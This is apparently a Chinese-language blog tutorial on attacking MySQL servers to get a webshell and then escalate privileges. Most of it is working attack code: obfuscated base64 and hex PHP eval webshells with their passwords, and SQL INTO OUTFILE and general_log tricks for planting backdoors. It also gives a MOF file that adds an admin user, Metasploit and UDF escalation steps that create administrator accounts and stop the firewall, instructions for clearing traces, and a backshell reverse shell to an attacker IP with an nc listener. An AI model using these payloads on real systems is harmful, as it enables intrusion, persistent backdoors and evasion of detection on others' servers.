+<h3 id="过杀毒软件方式"><a href="#过杀毒软件方式" class="headerlink" title="过杀毒软件方式"></a>过杀毒软件方式</h3><p>通过后台或者存在上传图片的地方，上传图片publicguide.jpg，内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUWydhbnRpYW4zNjUnXSk7ZGllKCk7Pz4='</span>;error_reporting(0);@set_time_limit(0);<span class="built_in">eval</span>(<span class="string">"?&gt;"</span>.base64_decode(<span class="variable">$a</span>));?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后通过图片包含temp.php，导出webshell。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php include '</span>publicguide.jpg<span class="string">' ?&gt;'</span>INTO OUTFILE <span class="string">'D:/work/WWW/antian365.php'</span></span><br></pre></td></tr></table></figure></p>
+<p>一句话后门密码：antian365</p>
+<h3 id="直接导出加密webshell"><a href="#直接导出加密webshell" class="headerlink" title="直接导出加密webshell"></a>直接导出加密webshell</h3><p>一句话后门文件密码：pp64mqa2x1rnw68，执行以下查询直接导出加密webshell，D:/WEB/IPTEST/22.php，注意在实际过程需要修改D:/WEB/IPTEST/22.php。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&apos;203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E&apos;) into dumpfile &apos;D:/WEB/IPTEST/22.php&apos;</span><br></pre></td></tr></table></figure></p>
+<p>注意：</p>
+<p>也可以使用<a href="http://tool.lu/hexstr/网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入unhex函数进行查询即可：" target="_blank" rel="noopener">http://tool.lu/hexstr/网站的代码转换来实现，将需要导出的文件代码复制到网站的字符串中，通过字符串转成十六进制，将十六进制字符串放入unhex函数进行查询即可：</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(<span class="string">'十六进制字符串'</span>) into dumpfile <span class="string">'D:/WEB/shell.php'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="CMS系统获取webshell"><a href="#CMS系统获取webshell" class="headerlink" title="CMS系统获取webshell"></a>CMS系统获取webshell</h3><p>有些情况下无法获取网站的真实路径，则意味着无法直接导出一句话webshell，可以通过CMS系统管理账号登录系统后，寻找漏文件来获取webshell。Discuz！的UC_key可以直接获取webshell。甚至某些系统可以直接上传php文件。下面是一些CMS系统渗透的技巧：</p>
+<p>（1）dedecms系统的密码有直接md5，也有20位的密码，如果是20位的密码则需要去掉密码中的前3位和最后1位，然后对剩余的值进行md5解密即可；</p>
+<p>（2）phpcms v9版本的密码需要加salt进行破解，需要选择破解算法md5(md5($pass).$salt)进行破解。</p>
+<p>（3）Discuz！论坛帐号保存在ucenter_members（Discuz7.X及以上版本）或者cdb_members（discuz6.x版本）表中，其破解需要带salt进行，其破解时是使用password:salt进行，例如a0513df9929afc972f024fa4e586e829:399793。</p>
+<h3 id="general-log-file获取webshell"><a href="#general-log-file获取webshell" class="headerlink" title="general_log_file获取webshell"></a>general_log_file获取webshell</h3><p>（1）查看genera文件配置情况<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like <span class="string">"%genera%"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>（2）关闭general_log<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log=off;</span><br></pre></td></tr></table></figure></p>
+<p>（3）通过general_log选项来获取webshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log=<span class="string">'on'</span>;</span><br><span class="line">SET global general_log_file=<span class="string">'D:/phpStudy/WWW/cmd.php'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>在查询中执行语句：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>Shell为cmd.php，一句话后门，密码为cmd。</p>
+<h2 id="sqlmap注入点获取webshell"><a href="#sqlmap注入点获取webshell" class="headerlink" title="sqlmap注入点获取webshell"></a>sqlmap注入点获取webshell</h2><p>sqlmap注入点获取webshell的前提是具备写权限，一般是root账号，通过执行命令来获取：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url--os-shell </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['c']);?&gt;"</span> &gt;/data/www/1.php</span><br></pre></td></tr></table></figure></p>
+<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="Webshell上传mof文件提权"><a href="#Webshell上传mof文件提权" class="headerlink" title="Webshell上传mof文件提权"></a>Webshell上传mof文件提权</h3><p>MySQL Root权限MOF方法提权是来自国外Kingcope大牛发布的MySQL Scanner &amp; MySQL Server for Windows Remote SYSTEM Level Exploit(<a href="https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/23083/)，简称mysql远程提权0day</a>(MySQL Windows Remote System Level Exploit (Stuxnet technique) 0day)。Windows 管理规范 (WMI) 提供了以下三种方法编译到 WMI 存储库的托管对象格式 (MOF) 文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法1：运行 MOF 文件指定为命令行参数 Mofcomp.exe 文件。</span><br><span class="line">方法2：使用 IMofCompiler 接口和 $ CompileFile 方法。</span><br><span class="line">方法3：拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</span><br></pre></td></tr></table></figure></p>
+<p>Microsoft建议您到存储库编译MOF文件使用前两种方法。也就是运行Mofcomp.exe文件，或使用IMofCompiler::CompileFile方法。第三种方法仅为向后兼容性与早期版本的WMI提供，并因为此功能可能不会提供在将来的版本后，不应使用。注意使用MOF方法提权的前提是当前Root帐号可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下，否则会失败！</p>
+<p>该漏洞的利用前提条件是必须具备mysql的root权限，在Kingcope公布的0day中公布了一个pl利用脚本。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl mysql_win_remote.pl192.168.2.100 root<span class="string">""</span>192.168.2.150 5555</span><br></pre></td></tr></table></figure></p>
+<p>192.168.2.100为mysql数据库所在服务器，mysql口令为空，反弹到192.168.2.150的5555端口上。</p>
+<h3 id="生成nullevt-mof文件"><a href="#生成nullevt-mof文件" class="headerlink" title="生成nullevt.mof文件"></a>生成nullevt.mof文件</h3><p>将以下代码保存为nullevt.mof文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription") </span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line"> &#123; </span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">Name  = <span class="string">"filtP2"</span>;     </span><br><span class="line">    Query = <span class="string">"Select \ From __InstanceModificationEvent "</span>      </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span>      </span><br><span class="line">             <span class="string">"And TargetInstance.Second = 5"</span>;      </span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;      </span><br><span class="line">&#125;;      </span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span>      </span><br><span class="line">&#123;      </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;      </span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;      </span><br><span class="line">ScriptText =      </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add"</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">&#125;; </span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Consumer   = <span class="variable">$Consumer</span>; </span></span><br><span class="line"><span class="string">    Filter = <span class="variable">$EventFilter</span>; </span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="通过Mysql查询将文件导入"><a href="#通过Mysql查询将文件导入" class="headerlink" title="通过Mysql查询将文件导入"></a>通过Mysql查询将文件导入</h3><p>执行以下查询语句，将上面生成的nullevt.mof导入到c:\windows\system32\wbem\mof\目录下在windows7中默认是拒绝<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selectload_file(<span class="string">'C:\\RECYCLER\\nullevt.mof'</span>) into dumpfile <span class="string">'c:/windows/system32/wbem/mof/nullevt.mof'</span>;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Msf直接mof提权"><a href="#Msf直接mof提权" class="headerlink" title="Msf直接mof提权"></a>Msf直接mof提权</h2><p>Msf下的exploit/windows/mysql/mysql_mof模块提供了直接Mof提权，不过该漏洞成功跟操作系统权限和Mysql数据库版本有关，执行成功后会直接反弹shell到meterpreter。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.157.1 //设置需要提权的远程主机IP地址</span><br><span class="line"><span class="built_in">set</span> rport 3306 //设置mysql的远程端口</span><br><span class="line"><span class="built_in">set</span> password root //设置mysql数据库root密码</span><br><span class="line"><span class="built_in">set</span> username root //设置mysql用户名</span><br><span class="line">options //查看设置</span><br><span class="line">run 0</span><br></pre></td></tr></table></figure></p>
+<p>技巧：</p>
+<p>要是能够通过网页连接管理（phpmyadmin），则可以修改host为%并刷新权限后，则可以通过msf等工具远程连接数据库。默认root等账号不允许远程连接，除非管理员或者数据库用户自己设置。</p>
+<h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>本地登入mysql，更改 mysql数据库里的 user 表里的 host项，将localhost改为%<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user = <span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES ;</span><br><span class="line">select host, user from user;</span><br></pre></td></tr></table></figure></p>
+<h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>直接授权(推荐)</p>
+<p>从任何主机上使用root用户，密码：youpassword（你的root密码）连接到mysql服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql -u root -proot</span></span><br><span class="line">GRANT ALL PRIVILEGES ON . TO <span class="string">'root'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'youpassword'</span> WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></p>
+<p>推荐重新增加一个用户，在实际测试过程中发现很多服务器使用root配置了多个地址，修改后可能会影响实际系统的运行。在实际测试过程中因此建议新增一个用户，授权所有权限，而不是直接更改root配置。</p>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限，其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码Windows下UDF提权对于Windows2008以下服务器比较适用，也即针对Windows2000、Windows2003的成功率较高。</p>
+<h3 id="UDF提权条件"><a href="#UDF提权条件" class="headerlink" title="UDF提权条件"></a>UDF提权条件</h3><p>（1）Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
+<p>（2）Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
+<p>（3）掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备`root账号所具备的权限的其它账号也可以。</p>
+<p>（4）可以将udf.dll写入到相应目录的权限。</p>
+<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><p>（1）获取数据库版本、数据位置以及插件位置等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select version();//获取数据库版本</span><br><span class="line">select user();//获取数据库用户</span><br><span class="line">select @@basedir ;//获取安装目录</span><br><span class="line">show variables like <span class="string">'%plugins%'</span>;  //寻找mysql安装路径</span><br></pre></td></tr></table></figure></p>
+<p>（2）导出路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Winnt\udf.dll    Windows 2000</span><br><span class="line">C:\Windows\udf.dll   Windows2003（有的系统被转义，需要改为C:Windowsudf.dll）</span><br></pre></td></tr></table></figure></p>
+<p>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的libplugin文件夹下才能创建自定义函数。该目录默认是不在安装目录下创建libplugin文件夹，然后将udf.dll文件导出到该目录即可。<br>在某些情况下，我们会遇到Can’t open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，<br>网上大牛发现利用NTFS ADS流来创建文件夹的方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;  //查找到mysql的目录</span><br><span class="line">select <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;   //利用NTFS ADS创建lib目录</span><br><span class="line">select <span class="string">'intodumpfile'</span>C:\\ProgramFiles\\MySQL\\MySQLServer5.1\\lib\\plugin::<span class="variable">$INDEX_ALLOCATION</span><span class="string">';//利用NTFS ADS创建plugin目录</span></span><br></pre></td></tr></table></figure></p>
+<p>执行成功以后就会plugin目录，然后再进行导出udf.dll即可。</p>
+<p>（3）创建cmdshell 函数，该函数叫什么名字在后续中则使用该函数进行查询：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create <span class="keyword">function</span> cmdshell returns string soname ‘lib_mysqludf_sys.dll’;</span><br></pre></td></tr></table></figure></p>
+<p>（4）执行命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(‘whoami’);</span><br></pre></td></tr></table></figure></p>
+<p>一般情况下不会出现创建不成功哦。连不上3389可以先停止windows防火墙和筛选<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(‘net stop policyagent’);</span><br><span class="line">select sys_eval(‘net stop sharedaccess’);</span><br></pre></td></tr></table></figure></p>
+<p>udf.dll下常见函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell  执行cmd;</span><br><span class="line">downloader  下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389    通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell   反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread     读注册表;</span><br><span class="line">regwrite    写注册表;</span><br><span class="line">shut        关机,注销,重启;</span><br><span class="line">about       说明与帮助函数;</span><br></pre></td></tr></table></figure></p>
+<p>具体用户示例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(<span class="string">'net user iis_user 123!@#abcABC /add'</span>);</span><br><span class="line">select cmdshell(<span class="string">'net localgroup administrators iis_user /add'</span>);</span><br><span class="line">select cmdshell(<span class="string">'regedit /s d:web3389.reg'</span>);</span><br><span class="line">select cmdshell(<span class="string">'netstat -an'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>（5）清除痕迹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop <span class="keyword">function</span> cmdshell;//将函数删除</span><br></pre></td></tr></table></figure></p>
+<p>删除udf.dll文件以及其它相关入侵文件及日志。</p>
+<p>（6）常见错误<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure></p>
+<p>在my.ini或者mysql.cnf文件中注销 (使用#号) 包含secure_file_priv的行(SHOW VARIABLES LIKE “secure_file_priv”)。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1123 - Can<span class="string">'t initialize function '</span>backshell<span class="string">'; UDFs are unavailable with the --skip-grant-tables option</span></span><br></pre></td></tr></table></figure></p>
+<p>需要将my.ini中的skip-grant-tables选项去掉。</p>
+<h3 id="webshell下udf提权"><a href="#webshell下udf提权" class="headerlink" title="webshell下udf提权"></a>webshell下udf提权</h3><p>通过集成udf提权的webshell输入数据库用户名及密码以及数据库服务器地址或者IP通过连接后导出进行提权。</p>
+<h3 id="Mysql提权综合利用工具"><a href="#Mysql提权综合利用工具" class="headerlink" title="Mysql提权综合利用工具"></a>Mysql提权综合利用工具</h3><p>v5est0r 写了一个Mysql提权综合利用工具，详细情况请参考其代码共享网站：</p>
+<p><a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">https://github.com/v5est0r/Python_FuckMySQL</a><br>其主要功能有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）自动导出你的backdoor和mof文件</span><br><span class="line">（2）自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权</span><br><span class="line">（3）导出LPK.dll文件，劫持系统目录提权</span><br><span class="line">（4）写启动项提权</span><br></pre></td></tr></table></figure></p>
+<p>UdF自动提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> -m udf</span><br></pre></td></tr></table></figure></p>
+<p>LPK劫持提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> -m lpk</span><br></pre></td></tr></table></figure></p>
+<p>启动项提权：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e <span class="string">"ver&amp;whoami"</span> –mst</span><br></pre></td></tr></table></figure></p>
+<p>例如通过LOAD_FILE来查看Mysql配置文件my.ini，如果其中配置了skip-grant-tables，这无法进行提权</p>
+<h2 id="无法获取webshell提权"><a href="#无法获取webshell提权" class="headerlink" title="无法获取webshell提权"></a>无法获取webshell提权</h2><h3 id="连接mysql"><a href="#连接mysql" class="headerlink" title="连接mysql"></a>连接mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）mysql.exe -h ip -uroot -p</span><br><span class="line">（2）phpmyadmin</span><br><span class="line">（3）Navicat <span class="keyword">for</span> MySQL</span><br></pre></td></tr></table></figure>
+<h3 id="查看数据库版本和数据路径"><a href="#查看数据库版本和数据路径" class="headerlink" title="查看数据库版本和数据路径"></a>查看数据库版本和数据路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   SELECT VERSION( );</span><br><span class="line">   Select @@datadir;</span><br><span class="line">   5.1以下版本，将dll导入到c:/windows或者c:/windows/system32/</span><br><span class="line">   5.1以上版本 通过以下查询来获取插件路径：</span><br><span class="line">SHOW VARIABLES WHERE Variable_Name LIKE <span class="string">"%dir"</span>;</span><br><span class="line">   show variables like <span class="string">'%plugin%'</span> ;</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/httpd.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/vhosts.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/extra/vhosts.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'C:/phpStudy/Apache/conf/extra/httpd.conf'</span>)</span><br><span class="line">   select load_file(<span class="string">'d:/phpStudy/Apache/conf/vhosts.conf'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="修改mysql-txt"><a href="#修改mysql-txt" class="headerlink" title="修改mysql.txt"></a>修改mysql.txt</h3><p>Mysql.txt为udf.dll的二进制文件转成十六进制代码。</p>
+<p>（1）先执行导入ghost表中的内容修改以下代码的末尾代码 select backshell(“YourIP”,4444);</p>
+<p>（2）导出文件到某个目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select data from Ghost into dumpfile <span class="string">'c:/windows/mysqldll.dll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'c:/windows/system32/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'c:/phpStudy/MySQL/lib/plugin/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'E:/PHPnow-1.5.6/MySQL-5.0.90/lib/plugin/mysqldll'</span>; </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'C:/websoft/MySQL/MySQL Server5.5/lib/plugin/mysqldll.dll'</span> </span><br><span class="line">select data from Ghost into dumpfile <span class="string">'D:/phpStudy/MySQL/lib/plugin/mysqldll.dll'</span>; </span><br><span class="line">select load_file(<span class="string">'C:/ProgramData/MySQL/MySQL Server 5.1/Data/mysql/user.frm'</span>);</span><br><span class="line">select data from Ghost intodumpfile<span class="string">'C:\ProgramFiles\MySQL\MySQLServer5.1\lib/plugin/mysqldll.dll'</span></span><br></pre></td></tr></table></figure></p>
+<p>（3）查看FUNCTION中是否存在cmdshell和backshell存在则删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop FUNCTION cmdshell;//删除cmdshell</span><br><span class="line">drop FUNCTION backshell;//删除backshell</span><br></pre></td></tr></table></figure></p>
+<p>创建backshell：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME <span class="string">'mysqldll.dll'</span>; //创建backshell</span><br></pre></td></tr></table></figure></p>
+<p>在具备独立主机的服务器上执行监听:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -l -p 44444</span><br></pre></td></tr></table></figure></p>
+<p>执行查询：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select backshell(<span class="string">"192.192.192.1"</span>,44444);//修改</span><br></pre></td></tr></table></figure></p>
+<p>192.192.192.1为你的IP和端口</p>
